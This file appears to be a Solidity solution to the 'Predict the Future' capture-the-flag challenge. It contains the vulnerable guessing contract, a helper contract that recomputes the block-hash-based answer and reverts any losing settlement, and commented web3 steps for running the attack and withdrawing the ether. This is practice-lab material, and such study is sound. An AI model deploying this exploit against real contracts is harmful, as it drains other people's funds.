pragma solidity ^0.4.21;

import './OtherContract.sol';
/*
const oneEth = web3.utils.toWei('1', 'ether');
var predictTheFutureChallenge = await PredictTheFutureChallenge.deployed();
var predictHelper = await PredictHelper.deployed();

var blockNumTarget = await web3.eth.getBlockNumber() + 2;
await web3.eth.getBlockNumber();
(await predictHelper.getAnswer()).toNumber()
await predictHelper.lockInGuess(0, {from: accounts[0], value: oneEth});
await web3.eth.getBlockNumber();
await predictHelper.wasteBlock();
await predictHelper.settle();
await predictHelper.isComplete();
await web3.eth.getBalance(predictTheFutureChallenge.address)
*/

// essential reading: https://solidity-by-example.org/hacks/accessing-private-data/

contract PredictHelper is OtherContract {
    uint8 public waste;
    uint8 guess;
    uint256 settlementBlockNumber;

    function getGuess() public view returns (uint8) {
        return guess;
    }

    function getSettlementBlockNumber() public view returns (uint256) {
        return settlementBlockNumber;
    }

    function getAnswer() public view returns (uint8) {
        return uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
    }

    function wasteBlock() public {
        waste += 1;
    }

    function() public payable { 
    }

    function isComplete() public view returns (bool) {
        require(otherContract != 0);
        PredictTheFutureChallenge predictTheFutureChallenge = PredictTheFutureChallenge(otherContract);
        return predictTheFutureChallenge.isComplete();
    }
    
    function lockInGuess(uint8 n) public payable {
        require(otherContract != 0);
        guess = n;
        settlementBlockNumber = block.number + 1;
        PredictTheFutureChallenge predictTheFutureChallenge = PredictTheFutureChallenge(otherContract);
        predictTheFutureChallenge.lockInGuess.value(1 ether)(n);
    }

    event SettleAttempt(uint8 calculatedAnswer, uint8 lockedInGuess);

    function settle() public returns (uint8 calculatedAnswer, uint8 lockedInGuess) {
        require(otherContract != 0);
        uint8 answer = getAnswer();
        calculatedAnswer = answer;
        lockedInGuess = guess;
        emit SettleAttempt(calculatedAnswer, lockedInGuess);

        PredictTheFutureChallenge predictTheFutureChallenge = PredictTheFutureChallenge(otherContract);
        
        predictTheFutureChallenge.settle();
        require(predictTheFutureChallenge.isComplete() == true);
        require(answer == guess);
    }

    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }
}

/*
# Storage
- 2 ** 256 slots
- 32 bytes for each slot
- data is stored sequentially in the order of declaration
- storage is optimized to save space. If neighboring variables fit in a single
  32 bytes, then they are packed into the same slot, starting from the right
*/

contract PredictTheFutureChallenge {
    address guesser;    // slot 0
    uint8 guess;        // appended to slot 0
    uint256 settlementBlockNumber;  // slot 1

    function PredictTheFutureChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
